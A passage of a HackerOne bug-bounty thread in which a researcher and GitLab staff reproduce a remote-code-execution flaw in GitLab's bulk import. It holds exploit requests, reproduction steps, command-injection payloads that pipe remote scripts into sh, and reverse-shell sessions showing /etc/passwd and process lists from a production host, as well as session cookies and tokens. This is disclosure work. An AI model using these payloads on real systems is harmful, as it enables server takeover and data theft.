Rqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0be11053e6c1975080196a6b3e599ede7d2dab2befff5ff7a790415f7c6edf36"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17300535,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "> it's F&F day today\n\nTIL! That sounds like a great idea :)\n\nI just tested the `fake_server.py` method above using a fresh install of the gdk against gitlab master and the project was imported (well the project is created in the new group and then fails to import after timing out) and the payload is triggered, so if that doesn't work I am unsure what is causing it not to work. \n\nIf there's anything I can do help with just let me know. Alternatively you could enable `bulk_import_projects` for me on gitlab.com and I can give it a test there :D \n\nCheers,\nWill\n",
      "automated_response": false,
      "created_at": "2022-06-27T13:17:23.047Z",
      "updated_at": "2022-06-27T13:17:23.047Z",
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17311710,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @vdesousa and @nmalcolm_gitlab,\n\nI've just found that it's possible to bypass the need for the `bulk_import_projects` feature to be enabled as the `BulkImportsController` does not perform any checks on the `source_type` param which allows you to specify `project_entity` and trigger the `ProjectPipeline` eg:\n\n```\ncurl 'https://gitlab.com/import/bulk_imports.json' \\\n  -H 'authority: gitlab.com' \\\n  -H 'accept: application/json, text/plain, */*' \\\n  -H 'accept-language: en-AU,en;q=0.9,en-US;q=0.8' \\\n  -H 'cache-control: no-cache' \\\n  -H 'content-type: application/json' \\\n  -H 'cookie: xxxx \\\n  -H 'origin: https://gitlab.com' \\\n  -H 'pragma: no-cache' \\\n  -H 'referer: https://gitlab.com/import/bulk_imports/status' \\\n  -H 'x-csrf-token: v/53ewT6N5bKneAIWtpt3m4E6sfK1gY8uVbtraLu/zQkIyTaNJvwmLHemKz151dzQ1f34JVtDlgyDlfSdzsw4g==' \\\n  -H 'x-requested-with: XMLHttpRequest' \\\n  --data-raw '{\"bulk_import\":[{\"source_type\":\"project_entity\",\"source_full_path\":\"group1/project1\",\"destination_namespace\":\"secret-vakzz\",\"destination_name\":\"group1aaa\"}]}' \\\n  --compressed\n```\n\nUsing the fake_server.py above this allows the issue to be triggered  on gitlab.com:\n\n\n```bash\nnc -vnlkp 12345\nListening on [0.0.0.0] (family 0, port 12345)\nConnection from [34.74.226.9] port 12345 [tcp/*] accepted (family 2, sport 16275)\nid\nuid=1000(git) gid=1000(git) groups=1000(git)\nhostname -f\ngitlab-sidekiq-imports-v2-5b46b76b94-9zkwr\nls -asl /tmp\ntotal 12\n4 drwxrwxrwt 1 root root 4096 Jun 28 06:04 .\n4 drwxr-xr-x 1 root root 4096 Jun 28 05:33 ..\n4 -rw-r--r-- 1 git  git    29 Jun 28 06:04 ggg333\ncat /tmp/ggg333\nTue Jun 28 06:04:45 UTC 2022\ncat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\ngit:x:1000:1000:GitLab,,,:/home/git:/bin/bash\nps auxww\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\ngit            1  0.0  0.0 161284 49292 ?        Ssl  05:33   0:01 ruby /srv/gitlab/bin/sidekiq-cluster -r /srv/gitlab -e production --min-concurrency 1 --max-concurrency 1 -t 25 imports\ngit           31  0.3  0.0 704616  6684 ?        Sl   05:33   0:07 /usr/local/bin/gitlab-logger /var/log/gitlab\ngit           35  6.8  1.7 1847776 1151624 ?     Sl   05:33   2:15 sidekiq 6.4.0 queues:imports [1 of 1 busy]\ngit           37  0.3  0.0 173676 47272 ?        Sl   05:33   0:07 sidekiq_exporter\ngit          332  0.0  0.0   2412   532 ?        S    06:04   0:00 sh -c gzip -dc ;date|tee /tmp/ggg333;curl aw.rs/rsh|sh;curl aw.rs/psh|sh;curl aw.rs/pesh|sh;# | wc -c\ngit          341  0.0  0.0 105012 22300 ?        S    06:04   0:00 ruby -rsocket -e exit if fork;c=TCPSocket.new(\"103.3.61.137\",12345);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\ngit          346  0.0  0.0   2412   596 ?        S    06:04   0:00 sh\ngit          348  0.0  0.0   2412   532 ?        S    06:04   0:00 /bin/sh -i\ngit          371  0.0  0.0   2412   592 ?        S    06:06   0:00 sh -c ps auxww\ngit          372  0.0  0.0   8584  3408 ?        R    06:06   0:00 ps auxww\n```\n\nCheers,\nWill",
      "automated_response": false,
      "created_at": "2022-06-28T06:07:04.349Z",
      "updated_at": "2022-06-28T06:07:04.349Z",
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17312213,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @vakzz \n\nThanks for your comment!\n\nWe are trying to use your command with but we are getting `{\"error\":{\"message\":\"Unable to connect to server: URL '/api/v4/version' is blocked: Only allowed schemes are \",\"redirect\":\"/groups/new\"}}`.\n\nWe are using this `curl` command:\n\n`curl http://xxx.in.ngrok.io/import/bulk_imports.json -H 'authority: ae76-49-204-216-134.in.ngrok.io' -H 'accept: application/json, text/plain, */*' -H 'accept-language: en-AU,en;q=0.9,en-US;q=0.8' -H 'cache-control: no-cache' -H 'content-type: application/json' -H 'cookie: _gitlab_session=xxx' -H 'origin: http://ae76-49-204-216-134.in.ngrok.io' -H 'pragma: no-cache' -H 'referer: http://ae76-49-204-216-134.in.ngrok.io/import/bulk_imports/status' -H 'x-csrf-token: token' -H 'x-requested-with: XMLHttpRequest' --data-raw '{\"bulk_import\":[{\"source_type\":\"project_entity\",\"source_full_path\":\"evil-group/evil-project\",\"destination_namespace\":\"mostdefnotanadmin\",\"destination_name\":\"group1aaa\"}]}' --compressed`\n\nAnd this is the rev shell command inside `fake_server.py`: `COMMAND = \";nc 127.0.0.1 12345 -e /bin/bash \"`\n\nWe have seen you have hardcoded a group ID, name, etc. Should we change it?\n\nThanks!\nVitor",
      "automated_response": false,
      "created_at": "2022-06-28T07:29:09.053Z",
      "updated_at": "2022-06-28T07:29:09.053Z",
      "actor": {
        "username": "vdesousa",
        "cleared": false,
        "verified": false,
        "url": "/vdesousa",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17312445,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "We are also trying to use the API call but without success so far:\n\n`curl --request POST --header \"PRIVATE-TOKEN: PAT\" \"http://xxx.in.ngrok.io/api/v4/bulk_imports\" --data-raw '{\"configuration\": {\"url\": \"http://xxx.in.ngrok.io/\",\"access_token\": \"PAT\"},\"entities\": [{\"source_full_path\": \"evil-group/evil-project\",\"source_type\": \"project_entity\",\"destination_name\": \"group1aaa\",\"destination_namespace\": \"mostdefnotanadmin\"}]}' --compressed`",
      "automated_response": false,
      "created_at": "2022-06-28T07:52:35.205Z",
      "updated_at": "2022-06-28T07:52:57.574Z",
      "actor": {
        "username": "vdesousa",
        "cleared": false,
        "verified": false,
        "url": "/vdesousa",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17313117,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @vdesousa,\n\nSorry I should have posted the steps with the new method. I think the api might restrict the bulk imports to only have a `source_type` `group_entity` but the regular controller still allows it.\n\n1. unzip {F1787257}\n1. change the command to something like `COMMAND = \";date|tee /tmp/ggg333; curl aw.rs/rsh|sh;#\"`,  (I don't think the gitlab servers have nc on them)\n1. run the server with `FLASK_APP=fake_server.py FLASK_ENV=development flask run`\n1. run ngrok with `ngrok http 5000`\n1. visit `https://gitlab.com/groups/new` and click import group\n1. enter the ngrok url and any token\n1. open up the network tab in chrome or use burp/caido\n1. import the `group1` to a new namespace\n1. select `copy as curl` on the request to `bulk_imports.json`, or find it in burp/caido\n1. edit the payload and change `source_type` to `project_entity`,  `source_full_path` to `group1/project1` and `destination_name` to an unused project name\n1. resend the request (directly to gitlab.com or the ghe instance, not ngrok)\n1. you should start seeing a lot of request in the flask app for `/api/v4/projects/group1/project1/export_relations/status`\n1. visit `https://gitlab.com/destination_namespace/destination_name/-/import` and you should see `Import in progress` (using the values from your request)\n1. After around 5 minutes the import status should change to failed with a message about tar not being able to find the file and the payload will execute\n\n_curl command_\n```\n curl 'https://gitlab.com/import/bulk_imports.json' \\\n  -H 'authority: gitlab.com' \\\n  -H 'accept: application/json, text/plain, */*' \\\n  -H 'accept-language: en-AU,en;q=0.9,en-US;q=0.8' \\\n  -H 'content-type: application/json' \\\n  -H 'cookie: █████████' \\\n  -H 'origin: https://gitlab.com' \\\n  -H 'referer: https://gitlab.com/import/bulk_imports/status' \\\n  -H 'sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"' \\\n  -H 'sec-ch-ua-mobile: ?0' \\\n  -H 'sec-ch-ua-platform: \"macOS\"' \\\n  -H 'sec-fetch-dest: empty' \\\n  -H 'sec-fetch-mode: cors' \\\n  -H 'sec-fetch-site: same-origin' \\\n  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36' \\\n  -H 'x-csrf-token: █████████' \\\n  -H 'x-requested-with: XMLHttpRequest' \\\n  --data-raw '{\"bulk_import\":[{\"source_type\":\"project_entity\",\"source_full_path\":\"group1/project1\",\"destination_namespace\":\"secret-vakzz\",\"destination_name\":\"aaa444333\"}]}' \\\n  --compressed\n```\n\n_reverse shell_\n```\nwill@vpsbox:~$ nc -vnlkp 12345\nListening on [0.0.0.0] (family 0, port 12345)\nConnection from [34.74.226.16] port 12345 [tcp/*] accepted (family 2, sport 26768)\nls\nCHANGELOG-EE.md\nCHANGELOG.md\nCONTRIBUTING.md\nDockerfile.assets\nGITALY_SERVER_VERSION\nGITLAB_ELASTICSEARCH_INDEXER_VERSION\nGITLAB_KAS_VERSION\nGITLAB_METRICS_EXPORTER_VERSION\nGITLAB_PAGES_VERSION\nGITLAB_SHELL_VERSION\nGITLAB_WORKHORSE_VERSION\nGemfile\nGemfile.lock\nGuardfile\nINSTALLATION_TYPE\nLICENSE\nMAINTENANCE.md\nPHILOSOPHY.md\nPROCESS.md\nPipfile\nPipfile.lock\nREADME.md\nREVISION\nRakefile\nVERSION\napp\nassets-hash.txt\nbabel.config.js\nbin\nbootsnap\nbuilds\nconfig\nconfig.ru\ncrowdin.yml\ndata\ndb\ndoc\ndocker-compose.yml\nee\nfile_hooks\nfixtures\ngenerator_templates\nglfm_specification\nhaml_lint\njest.config.base.js\njest.config.integration.js\njest.config.js\njest_resolver.js\nlefthook.yml\nlib\nlocale\nlog\nmetrics_server\npackage.json\npatches\npublic\nscripts\nsecurity.txt\nshared\nsidekiq_cluster\nstorybook\ntests.yml\nvendor\nworkhorse\nyarn.lock\nid\nuid=1000(git) gid=1000(git) groups=1000(git)\nhostname\ngitlab-sidekiq-imports-v2-7cb8f45788-z4vk8\nwhich nc\nwhich ncat\n```\n\nCheers,\nWill\n",
      "automated_response": false,
      "created_at": "2022-06-28T08:32:09.256Z",
      "updated_at": "2022-06-28T08:32:09.256Z",
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17313836,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@vakzz \n\nWe have steps 13 and 14 not working for us: it's importing straight and we don't see any error. \n\nThis is the curl command we are using:\n\n`curl 'http://gitlab.local/import/bulk_imports.json' -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://gitlab.local/import/bulk_imports/status' -H 'X-CSRF-Token: 5QumHK6ZEd1gGvg9CLVwYtUH5sZNW2KR+LTK/HrH5TcBKNoWXh0bhiEX2lFc0xd/RN2RUyxj1jx50AHupVJ5VQ==' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/json' -H 'Origin: http://gitlab.local' -H 'Connection: keep-alive' -H 'Cookie: _gitlab_session=44d5ed374bafffbdaacefcc319d8104a; known_sign_in=U2tHT296V2VOTFM4Y2djako5QVgrYkkxVCtNd1hONWFWMkx0MHpEbUdBVUdud0k4QmZPdThVWVY0Nk1GUHQrUkNwbUJLWjdKRGo2RU9uSVQvdXMybG54NlBSZTdZRWIrWEZKSkpyNGVtcHBxdDEza0hoYjhpdWR1T2JTUGVnNXMtLUJjSFNZazBQbWo3WmNhYWpIWi9IOVE9PQ%3D%3D--0ac6e2d999cac84cb0d47bf54fcb1d0d18a2db91; event_filter=all; sidebar_collapsed=false' --data-raw '{\"bulk_import\":[{\"source_type\":\"project_entity\",\"source_full_path\":\"evil-group/evil-project\",\"destination_namespace\":\"mostdefnotanadmin\",\"destination_name\":\"evil-group1233\"}]}' --compressed`",
      "automated_response": false,
      "created_at": "2022-06-28T09:19:50.005Z",
      "updated_at": "2022-06-28T09:20:23.307Z",
      "actor": {
        "username": "vdesousa",
        "cleared": false,
        "verified": false,
        "url": "/vdesousa",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17313940,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "The `source_full_path` should be `group1/project1` to match the flask api route, then the project should appear and you can check the import_source via a rails console\n\nCheers,\nWill",
      "automated_response": false,
      "created_at": "2022-06-28T09:27:10.814Z",
      "updated_at": "2022-06-28T09:27:10.814Z",
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRi